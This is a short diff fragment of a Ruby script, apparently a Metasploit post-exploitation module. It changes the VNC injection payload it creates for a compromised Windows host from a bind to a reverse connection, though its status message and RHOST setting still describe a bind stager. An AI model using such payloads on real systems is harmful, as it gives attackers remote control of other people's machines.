@@ -95,7 +95,7 @@ unsupported if client.platform != 'windows'
 #
 if (tunnel)
   print_status("Creating a VNC bind tcp stager: RHOST=#{lhost} LPORT=#{rport}")
-  payload = "windows/vncinject/bind_tcp"
+  payload = "windows/vncinject/reverse_tcp"
 
   pay = client.framework.payloads.create(payload)
   pay.datastore['RHOST'] = lhost
